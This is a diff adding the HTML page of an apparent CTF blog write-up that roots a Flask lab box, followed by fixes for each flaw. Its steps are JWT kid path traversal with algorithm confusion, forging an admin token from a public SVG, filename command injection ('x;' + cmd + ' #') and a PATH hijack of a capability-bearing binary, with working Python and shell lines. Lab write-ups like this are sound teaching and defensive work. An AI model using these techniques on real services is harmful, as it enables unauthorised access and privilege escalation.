@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Pearl Harbour: A Forged Captain and a Capability That Sailed to Root | z3ro :: CTF &amp; Security Research</title>
+<meta name="keywords" content="CTF, Web Exploitation, JWT, Command Injection, Linux Privilege Escalation, Boot2Root">
+<meta name="description" content="A tiny Flask app called the Pacific Fleet Cargo and Manifest Registry. It hands out guest JWTs, trusts the kid and alg fields in the header, and shells out to pdftotext with a filename I control. Three mistakes later: root.">
+<meta name="author" content="z3ro">
+<link rel="canonical" href="https://frankie7techy.github.io/public/posts/pearl-harbour-forged-captain/">
+<link crossorigin="anonymous" href="/public/assets/css/stylesheet.2e9596eb0a4be44362e84d18a97c975d280ce315277cfb69c076efa9dbdd5809.css" integrity="sha256-LpWW6wpL5ENi6E0YqXyXXSgM4xUnfPtpwHbvqdvdWAk=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://frankie7techy.github.io/public/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://frankie7techy.github.io/public/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://frankie7techy.github.io/public/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://frankie7techy.github.io/public/apple-touch-icon.png">
+<link rel="mask-icon" href="https://frankie7techy.github.io/public/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://frankie7techy.github.io/public/posts/pearl-harbour-forged-captain/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://frankie7techy.github.io/public/posts/pearl-harbour-forged-captain/">
+  <meta property="og:site_name" content="z3ro :: CTF & Security Research">
+  <meta property="og:title" content="Pearl Harbour: A Forged Captain and a Capability That Sailed to Root">
+  <meta property="og:description" content="A tiny Flask app called the Pacific Fleet Cargo and Manifest Registry. It hands out guest JWTs, trusts the kid and alg fields in the header, and shells out to pdftotext with a filename I control. Three mistakes later: root.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-10-13T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-10-13T00:00:00+00:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web Exploitation">
+    <meta property="article:tag" content="JWT">
+    <meta property="article:tag" content="Command Injection">
+    <meta property="article:tag" content="Linux Privilege Escalation">
+    <meta property="article:tag" content="Boot2Root">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pearl Harbour: A Forged Captain and a Capability That Sailed to Root">
+<meta name="twitter:description" content="A tiny Flask app called the Pacific Fleet Cargo and Manifest Registry. It hands out guest JWTs, trusts the kid and alg fields in the header, and shells out to pdftotext with a filename I control. Three mistakes later: root.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://frankie7techy.github.io/public/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Pearl Harbour: A Forged Captain and a Capability That Sailed to Root",
+      "item": "https://frankie7techy.github.io/public/posts/pearl-harbour-forged-captain/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Pearl Harbour: A Forged Captain and a Capability That Sailed to Root",
+  "name": "Pearl Harbour: A Forged Captain and a Capability That Sailed to Root",
+  "description": "A tiny Flask app called the Pacific Fleet Cargo and Manifest Registry. It hands out guest JWTs, trusts the kid and alg fields in the header, and shells out to pdftotext with a filename I control. Three mistakes later: root.",
+  "keywords": [
+    "CTF", "Web Exploitation", "JWT", "Command Injection", "Linux Privilege Escalation", "Boot2Root"
+  ],
+  "articleBody": " Web Boot2Root 2 flags r00t CTF · Pearl Harbour PEARL HARBOUR A single Flask service calling itself the Pacific Fleet Cargo and Manifest Registry. It mints guest JWTs, then reads the verification key from a path you control and honours the algorithm you name. The admin export route runs pdftotext through a shell with a filename you also control. Past that, root is one Linux capability and one very suggestible execlp away.\n5000Only open port 2Bugs on the web face 1Capability to root 2Flags captured user.txt r00t{a_t0rp3d0_n4m3d_k1d} root.txt r00t{c4p_s3tu1d_s4nk_th3_f1l33t} TL;DR Pearl Harbour is a small Python app wearing a naval uniform. The whole box is four moves:\nPOST /api/guest/token returns an RS256 JWT. Its header carries a kid, and the app opens the key file named by that kid with no path sanitisation at all. I point kid at a file whose bytes I can already read (a public SVG served by the same app), flip alg to HS256, and sign my own role=admin token with those bytes as the HMAC key. POST /api/diagnostics/export builds a pdftotext command with my filename in it and runs it through a shell. Semicolons are welcome. getcap -r / shows manifest-sign carrying cap_setgid,cap_setuid=ep, and it calls execlp(\"manifest-helper\", ...). I own $PATH, so I own what runs as root. Step 0: One Port, Nothing Else The target was a single host behind the VPN, 172.16.1.10. A full sweep turned up exactly one thing listening:\nWerkzeug 3.1.9 on Python 3.12.15. The root page is a shipping manifest UI. The interesting surface is the JSON API behind it:\nPOST /api/guest/token issues a token to anyone. GET /api/manifest/list needs a valid token, but only an inspector one. POST /api/diagnostics/export is the documented admin route. Fetching a guest token gives a perfectly normal RS256 JWT. Decoding the header tells the whole story before a single signature is checked:\nalg: RS256 kid: default.pub.pem typ: JWT Two of those three fields are attacker input as far as the server is concerned.\nStep 1: It Reads the Key From My Path Here is the vulnerable verification path, lightly abridged:\ndef verify_token(token): header = jwt.get_unverified_header(token) kid = header.get(\"kid\", DEFAULT_KID) alg = header.get(\"alg\", \"RS256\") key_path = os.path.join(KEYS_DIR, kid) # \u003c-- no sanitisation with open(key_path, \"rb\") as f: key_material = f.read() claims = jwt.decode(token, key_material, algorithms=[alg]) # \u003c-- alg from the header return claims Two lines, two problems. The kid is concatenated straight onto the keys directory, so ../../ walks wherever I like. The alg is taken from the header and handed to PyJWT, so I choose how the signature gets checked.\nThere is a decoy endpoint, /api/token/refresh, that looks like it has the same kid handling but reduces it with os.path.basename and pins alg to RS256 server side. If you pattern match on “found a kid, done”, that one wastes your evening. The real bug lives in the verifier every other route actually calls.\nThe key idea A JWT is only as trustworthy as the key the verifier picks. If the token gets to name its own key file and its own algorithm, then the attacker and the server can be holding the exact same secret, and only one of them knows it.\nStep 2: Algorithm Confusion, Signed With a Public File The app serves a decorative file, /static/dockyard-emblem.svg, to every visitor. I can download it. So can the server. That is a shared secret in the worst possible sense: it is not secret at all, and I can make the server use it as the HMAC key.\nThe plan:\nkid = ../static/dockyard-emblem.svg, which resolves to a readable file that is not a key. alg = HS256, so PyJWT treats those bytes as a symmetric key. Sign {\"sub\": \"admin\", \"role\": \"admin\"} with the same bytes. The whole forgery is about a dozen lines:\nimport base64, json, hmac, hashlib, requests B = \"http://172.16.1.10:5000\" key = requests.get(B + \"/static/dockyard-emblem.svg\").content # anyone can fetch this def b64url(b): if isinstance(b, str): b = b.encode() return base64.urlsafe_b64encode(b).rstrip(b\"=\").decode() header = {\"alg\": \"HS256\", \"kid\": \"../static/dockyard-emblem.svg\", \"typ\": \"JWT\"} payload = {\"sub\": \"admin\", \"role\": \"admin\"} h = b64url(json.dumps(header, separators=(\",\", \":\"))) p = b64url(json.dumps(payload, separators=(\",\", \":\"))) sig = b64url(hmac.new(key, (h + \".\" + p).encode(), hashlib.sha256).digest()) token = h + \".\" + p + \".\" + sig That token opens the admin door. The first manifest/list call with it returns data instead of a 403, which is the moment the box tips over from reading to doing:\nStep 2b: The Export Route Runs a Shell The admin diagnostics route is meant to convert a stored manifest to text with the system pdftotext. It takes a JSON filename and builds a command with it. Somewhere in the code that command goes to subprocess with shell=True, and there is no argument escaping.\nAn injection here does not need anything clever. A leading x; closes the harmless first command, # comments out the rest of the template, and whatever sits in the middle runs:\ndef run(cmd): body = {\"filename\": \"x;\" + cmd + \" #\"} r = requests.post(B + \"/api/diagnostics/export\", headers={\"Authorization\": \"Bearer \" + token}, json=body) return r.json()[\"stdout\"] cat /home/dockhand/user.txt returns the first flag. So does almost anything else, because I now have a shell as the dockhand service account:\nAt this point I have uid=1000(dockhand), a home directory, and the user flag. Root is not reachable through the app at all, which is the point. It lives outside the web surface.\nStep 3: Root Is a Capability and a PATH The classic first move after landing is getcap -r /, and it pays off immediately:\n/usr/local/bin/manifest-sign cap_setgid,cap_setuid=ep manifest-sign is a small binary that, by design, drops to root so it can sign cargo manifests. It does that with file capabilities. Then it invokes a helper. The helper is called by bare name:\nexeclp(\"manifest-helper\", ...) execlp searches $PATH. There is a legitimate manifest-helper in /usr/local/bin, but if I put my own earlier in the path, mine wins. The binary is the one running as root, so the helper I supply runs as root too:\n# attacker-controlled $PATH echo 'cat /root/root.txt' \u003e /tmp/ph/manifest-helper chmod +x /tmp/ph/manifest-helper PATH=/tmp/ph:$PATH /usr/local/bin/manifest-sign That prints the root flag. No exploit code, no memory corruption, just a root process trusting the environment it was launched in:\nBoth flags down user.txt came from the injected shell. root.txt came from hijacking a helper that a capability-bearing binary called by relative name. Two clean bugs on the way in, one configuration mistake on the way up.\nWhat I Would Fix None of this is exotic, which is exactly why it is worth writing down. Four changes close the box:\n✗ kgid/key path from the token Never derive a filesystem path from a token header. Pin the key to a known, mapped `kid` value and reject anything that does not match. no traversal, no key swap ✗ algorithm chosen by the caller Pin the expected algorithm server side. If the service issues RS256, verify RS256 and nothing else. HS256 tokens stop working ✗ shelling out with a filename Pass arguments as a list to `subprocess` without `shell=True`, and validate the filename against a strict allowlist. semicolons become literal text ✗ a root helper found on PATH Call the helper by absolute path, or drop the capability entirely and use a narrowly scoped root service. the environment stops mattering Flags user.txt\nr00t{a_t0rp3d0_n4m3d_k1d}\nshell injection as dockhand root.txt\nr00t{c4p_s3tu1d_s4nk_th3_f1l33t}\ncapability plus PATH hijack A good reminder that a JWT is only as trustworthy as the two fields you refuse to read from it. The attack was not a cracked signature. It was the server asking the token how it should be verified. Thanks for reading.\n",
+  "wordCount" : "1264",
+  "inLanguage": "en",
+  "datePublished": "2026-10-13T00:00:00Z",
+  "dateModified": "2026-10-13T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "z3ro"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://frankie7techy.github.io/public/posts/pearl-harbour-forged-captain/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "z3ro :: CTF \u0026 Security Research",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://frankie7techy.github.io/public/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://frankie7techy.github.io/public/" accesskey="h" title="z3ro :: CTF &amp; Security Research (Alt + H)">z3ro :: CTF &amp; Security Research</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://frankie7techy.github.io/public/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://frankie7techy.github.io/public/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Pearl Harbour: A Forged Captain and a Capability That Sailed to Root
+    </h1>
+    <div class="post-description">
+      A tiny Flask app called the Pacific Fleet Cargo and Manifest Registry. It hands out guest JWTs, trusts the kid and alg fields in the header, and shells out to pdftotext with a filename I control. Three mistakes later: root.
+    </div>
+    <div class="post-meta"><span title='2026-10-13 00:00:00 +0000 UTC'>October 13, 2026</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>z3ro</span>
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#tldr" aria-label="TL;DR">TL;DR</a></li>
+                <li>
+                    <a href="#step-0-one-port-nothing-else" aria-label="Step 0: One Port, Nothing Else">Step 0: One Port, Nothing Else</a></li>
+                <li>
+                    <a href="#step-1-it-reads-the-key-from-my-path" aria-label="Step 1: It Reads the Key From My Path">Step 1: It Reads the Key From My Path</a></li>
+                <li>
+                    <a href="#step-2-algorithm-confusion-signed-with-a-public-file" aria-label="Step 2: Algorithm Confusion, Signed With a Public File">Step 2: Algorithm Confusion, Signed With a Public File</a></li>
+                <li>
+                    <a href="#step-2b-the-export-route-runs-a-shell" aria-label="Step 2b: The Export Route Runs a Shell">Step 2b: The Export Route Runs a Shell</a></li>
+                <li>
+                    <a href="#step-3-root-is-a-capability-and-a-path" aria-label="Step 3: Root Is a Capability and a PATH">Step 3: Root Is a Capability and a PATH</a></li>
+                <li>
+                    <a href="#what-i-would-fix" aria-label="What I Would Fix">What I Would Fix</a></li>
+                <li>
+                    <a href="#flags" aria-label="Flags">Flags</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><div class="dr-hero">
+  <div class="dr-hero-top">
+    <span class="dr-badge">Web</span>
+    <span class="dr-badge red">Boot2Root</span>
+    <span class="dr-badge cyan">2 flags</span>
+    <span class="dr-badge ghost">r00t CTF · Pearl Harbour</span>
+  </div>
+  <div class="dr-title">PEARL HARBOUR</div>
+  <p class="dr-sub">A single Flask service calling itself the <strong>Pacific Fleet Cargo and Manifest Registry</strong>. It mints guest JWTs, then reads the verification key from a path you control and honours the algorithm you name. The admin export route runs <code>pdftotext</code> through a shell with a filename you also control. Past that, root is one Linux capability and one very suggestible <code>execlp</code> away.</p>
+</div>
+<div class="dr-stats">
+  <div class="dr-stat"><span class="n cyan">5000</span><span class="l">Only open port</span></div>
+  <div class="dr-stat"><span class="n">2</span><span class="l">Bugs on the web face</span></div>
+  <div class="dr-stat"><span class="n red">1</span><span class="l">Capability to root</span></div>
+  <div class="dr-stat"><span class="n">2</span><span class="l">Flags captured</span></div>
+</div>
+<div class="dr-flag">
+  <span class="l">user.txt</span>
+  <code>r00t{a_t0rp3d0_n4m3d_k1d}</code>
+</div>
+<div class="dr-flag">
+  <span class="l">root.txt</span>
+  <code>r00t{c4p_s3tu1d_s4nk_th3_f1l33t}</code>
+</div>
+<h2 id="tldr">TL;DR<a hidden class="anchor" aria-hidden="true" href="#tldr">#</a></h2>
+<p>Pearl Harbour is a small Python app wearing a naval uniform. The whole box is four moves:</p>
+<ol>
+<li><code>POST /api/guest/token</code> returns an RS256 JWT. Its header carries a <code>kid</code>, and the app opens the key file named by that <code>kid</code> with no path sanitisation at all.</li>
+<li>I point <code>kid</code> at a file whose bytes I can already read (a public SVG served by the same app), flip <code>alg</code> to <code>HS256</code>, and sign my own <code>role=admin</code> token with those bytes as the HMAC key.</li>
+<li><code>POST /api/diagnostics/export</code> builds a <code>pdftotext</code> command with my filename in it and runs it through a shell. Semicolons are welcome.</li>
+<li><code>getcap -r /</code> shows <code>manifest-sign</code> carrying <code>cap_setgid,cap_setuid=ep</code>, and it calls <code>execlp(&quot;manifest-helper&quot;, ...)</code>. I own <code>$PATH</code>, so I own what runs as root.</li>
+</ol>
+<p><img alt="The Pearl Harbour chain: guest token, a traversal in kid, algorithm confusion, command injection, and a capability that ends at root" loading="lazy" src="/public/images/pearl-harbour/00_chain.svg"></p>
+<h2 id="step-0-one-port-nothing-else">Step 0: One Port, Nothing Else<a hidden class="anchor" aria-hidden="true" href="#step-0-one-port-nothing-else">#</a></h2>
+<p>The target was a single host behind the VPN, <code>172.16.1.10</code>. A full sweep turned up exactly one thing listening:</p>
+<p><img alt="A full nmap sweep returns a single open port and a Werkzeug banner" loading="lazy" src="/public/images/pearl-harbour/01_recon.png"></p>
+<p>Werkzeug 3.1.9 on Python 3.12.15. The root page is a shipping manifest UI. The interesting surface is the JSON API behind it:</p>
+<ul>
+<li><code>POST /api/guest/token</code> issues a token to anyone.</li>
+<li><code>GET /api/manifest/list</code> needs <strong>a</strong> valid token, but only an inspector one.</li>
+<li><code>POST /api/diagnostics/export</code> is the documented admin route.</li>
+</ul>
+<p>Fetching a guest token gives a perfectly normal RS256 JWT. Decoding the header tells the whole story before a single signature is checked:</p>
+<pre tabindex="0"><code>alg: RS256    kid: default.pub.pem    typ: JWT
+</code></pre><p>Two of those three fields are attacker input as far as the server is concerned.</p>
+<h2 id="step-1-it-reads-the-key-from-my-path">Step 1: It Reads the Key From My Path<a hidden class="anchor" aria-hidden="true" href="#step-1-it-reads-the-key-from-my-path">#</a></h2>
+<p>Here is the vulnerable verification path, lightly abridged:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">verify_token</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">header</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">get_unverified_header</span><span class="p">(</span><span class="n">token</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">kid</span> <span class="o">=</span> <span class="n">header</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;kid&#34;</span><span class="p">,</span> <span class="n">DEFAULT_KID</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">alg</span> <span class="o">=</span> <span class="n">header</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;alg&#34;</span><span class="p">,</span> <span class="s2">&#34;RS256&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">key_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">KEYS_DIR</span><span class="p">,</span> <span class="n">kid</span><span class="p">)</span>   <span class="c1"># &lt;-- no sanitisation</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">key_path</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key_material</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">claims</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">key_material</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="n">alg</span><span class="p">])</span>  <span class="c1"># &lt;-- alg from the header</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">claims</span>
+</span></span></code></pre></div><p>Two lines, two problems. The <code>kid</code> is concatenated straight onto the keys directory, so <code>../../</code> walks wherever I like. The <code>alg</code> is taken from the header and handed to PyJWT, so I choose how the signature gets checked.</p>
+<p>There is a decoy endpoint, <code>/api/token/refresh</code>, that looks like it has the same <code>kid</code> handling but reduces it with <code>os.path.basename</code> and pins <code>alg</code> to RS256 server side. If you pattern match on &ldquo;found a <code>kid</code>, done&rdquo;, that one wastes your evening. The real bug lives in the verifier every other route actually calls.</p>
+<div class="dr-callout warn">
+  <span class="t">The key idea</span>
+  <p>A JWT is only as trustworthy as the key the verifier picks. If the token gets to name its own key file <strong>and</strong> its own algorithm, then the attacker and the server can be holding the exact same secret, and only one of them knows it.</p>
+</div>
+<h2 id="step-2-algorithm-confusion-signed-with-a-public-file">Step 2: Algorithm Confusion, Signed With a Public File<a hidden class="anchor" aria-hidden="true" href="#step-2-algorithm-confusion-signed-with-a-public-file">#</a></h2>
+<p>The app serves a decorative file, <code>/static/dockyard-emblem.svg</code>, to every visitor. I can download it. So can the server. That is a shared secret in the worst possible sense: it is not secret at all, and I can make the server use it as the HMAC key.</p>
+<p>The plan:</p>
+<ul>
+<li><code>kid</code> = <code>../static/dockyard-emblem.svg</code>, which resolves to a readable file that is not a key.</li>
+<li><code>alg</code> = <code>HS256</code>, so PyJWT treats those bytes as a symmetric key.</li>
+<li>Sign <code>{&quot;sub&quot;: &quot;admin&quot;, &quot;role&quot;: &quot;admin&quot;}</code> with the same bytes.</li>
+</ul>
+<p>The whole forgery is about a dozen lines:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span><span class="o">,</span> <span class="nn">json</span><span class="o">,</span> <span class="nn">hmac</span><span class="o">,</span> <span class="nn">hashlib</span><span class="o">,</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">B</span> <span class="o">=</span> <span class="s2">&#34;http://172.16.1.10:5000&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">B</span> <span class="o">+</span> <span class="s2">&#34;/static/dockyard-emblem.svg&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>  <span class="c1"># anyone can fetch this</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">b64url</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">base64</span><span class="o">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;=&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">header</span>  <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;alg&#34;</span><span class="p">:</span> <span class="s2">&#34;HS256&#34;</span><span class="p">,</span> <span class="s2">&#34;kid&#34;</span><span class="p">:</span> <span class="s2">&#34;../static/dockyard-emblem.svg&#34;</span><span class="p">,</span> <span class="s2">&#34;typ&#34;</span><span class="p">:</span> <span class="s2">&#34;JWT&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;sub&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">,</span> <span class="s2">&#34;role&#34;</span><span class="p">:</span> <span class="s2">&#34;admin&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">b64url</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">header</span><span class="p">,</span>  <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">b64url</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="s2">&#34;,&#34;</span><span class="p">,</span> <span class="s2">&#34;:&#34;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">sig</span> <span class="o">=</span> <span class="n">b64url</span><span class="p">(</span><span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="s2">&#34;.&#34;</span> <span class="o">+</span> <span class="n">p</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">token</span> <span class="o">=</span> <span class="n">h</span> <span class="o">+</span> <span class="s2">&#34;.&#34;</span> <span class="o">+</span> <span class="n">p</span> <span class="o">+</span> <span class="s2">&#34;.&#34;</span> <span class="o">+</span> <span class="n">sig</span>
+</span></span></code></pre></div><p>That token opens the admin door. The first <code>manifest/list</code> call with it returns data instead of a 403, which is the moment the box tips over from reading to doing:</p>
+<p><img alt="The forged token is built from a public file, and the app verifies it happily" loading="lazy" src="/public/images/pearl-harbour/02_forge.png"></p>
+<h2 id="step-2b-the-export-route-runs-a-shell">Step 2b: The Export Route Runs a Shell<a hidden class="anchor" aria-hidden="true" href="#step-2b-the-export-route-runs-a-shell">#</a></h2>
+<p>The admin diagnostics route is meant to convert a stored manifest to text with the system <code>pdftotext</code>. It takes a JSON <code>filename</code> and builds a command with it. Somewhere in the code that command goes to <code>subprocess</code> with <code>shell=True</code>, and there is no argument escaping.</p>
+<p>An injection here does not need anything clever. A leading <code>x;</code> closes the harmless first command, <code>#</code> comments out the rest of the template, and whatever sits in the middle runs:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">body</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;filename&#34;</span><span class="p">:</span> <span class="s2">&#34;x;&#34;</span> <span class="o">+</span> <span class="n">cmd</span> <span class="o">+</span> <span class="s2">&#34; #&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">B</span> <span class="o">+</span> <span class="s2">&#34;/api/diagnostics/export&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                      <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;Authorization&#34;</span><span class="p">:</span> <span class="s2">&#34;Bearer &#34;</span> <span class="o">+</span> <span class="n">token</span><span class="p">},</span> <span class="n">json</span><span class="o">=</span><span class="n">body</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&#34;stdout&#34;</span><span class="p">]</span>
+</span></span></code></pre></div><p><code>cat /home/dockhand/user.txt</code> returns the first flag. So does almost anything else, because I now have a shell as the <code>dockhand</code> service account:</p>
+<p><img alt="The export route returns clean command output, including user.txt" loading="lazy" src="/public/images/pearl-harbour/03_rce.png"></p>
+<p>At this point I have <code>uid=1000(dockhand)</code>, a home directory, and the user flag. Root is not reachable through the app at all, which is the point. It lives outside the web surface.</p>
+<h2 id="step-3-root-is-a-capability-and-a-path">Step 3: Root Is a Capability and a PATH<a hidden class="anchor" aria-hidden="true" href="#step-3-root-is-a-capability-and-a-path">#</a></h2>
+<p>The classic first move after landing is <code>getcap -r /</code>, and it pays off immediately:</p>
+<pre tabindex="0"><code>/usr/local/bin/manifest-sign cap_setgid,cap_setuid=ep
+</code></pre><p><code>manifest-sign</code> is a small binary that, by design, drops to root so it can sign cargo manifests. It does that with file capabilities. Then it invokes a helper. The helper is called by bare name:</p>
+<pre tabindex="0"><code>execlp(&#34;manifest-helper&#34;, ...)
+</code></pre><p><code>execlp</code> searches <code>$PATH</code>. There is a legitimate <code>manifest-helper</code> in <code>/usr/local/bin</code>, but if I put my own earlier in the path, mine wins. The binary is the one running as root, so the helper I supply runs as root too:</p>
